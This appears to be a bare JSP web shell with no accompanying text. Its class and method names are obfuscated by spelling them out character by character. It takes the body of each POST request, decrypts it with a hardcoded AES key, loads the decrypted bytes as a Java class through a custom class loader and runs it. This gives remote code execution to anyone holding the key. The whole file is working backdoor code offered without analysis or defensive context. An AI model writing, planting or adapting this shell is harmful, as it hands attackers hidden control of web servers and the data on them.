<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*"%><%!
private byte[] z(byte[] a)throws Exception{String k=new String(new char[]{'d','8','7','3','2','9','8','e','2','7','2','d','8','2','7','0'});javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(new String(new char[]{'A','E','S','/','E','C','B','/','P','K','C','S','5','P','a','d','d','i','n','g'}));c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),new String(new char[]{'A','E','S'})));byte[] b;Class cls;try{cls=Class.forName(new String(new char[]{'j','a','v','a','.','u','t','i','l','.','B','a','s','e','6','4'}));Object dec=cls.getMethod(new String(new char[]{'g','e','t','D','e','c','o','d','e','r'}),(Class[])null).invoke(cls,(Object[])null);b=(byte[])dec.getClass().getMethod(new String(new char[]{'d','e','c','o','d','e'}),new Class[]{byte[].class}).invoke(dec,new Object[]{a});}catch(Throwable e){cls=Class.forName(new String(new char[]{'s','u','n','.','m','i','s','c','.','B','A','S','E','6','4','D','e','c','o','d','e','r'}));Object dec=cls.newInstance();b=(byte[])dec.getClass().getMethod(new String(new char[]{'d','e','c','o','d','e','B','u','f','f','e','r'}),new Class[]{String.class}).invoke(dec,new Object[]{new String(a)});}return c.doFinal(b);} %><%!class Q extends ClassLoader{Q(ClassLoader l){super(l);}public Class t(byte[]x){return super.defineClass(x,0,x.length);}}%><%if("POST".equals(request.getMethod())){ByteArrayOutputStream o=new ByteArrayOutputStream();byte[] p=new byte[512];int q=request.getInputStream().read(p);while(q>0){o.write(Arrays.copyOfRange(p,0,q));q=request.getInputStream().read(p);}out.clear();out=pageContext.pushBody();new Q(this.getClass().getClassLoader()).t(z(o.toByteArray())).newInstance().equals(pageContext);} %>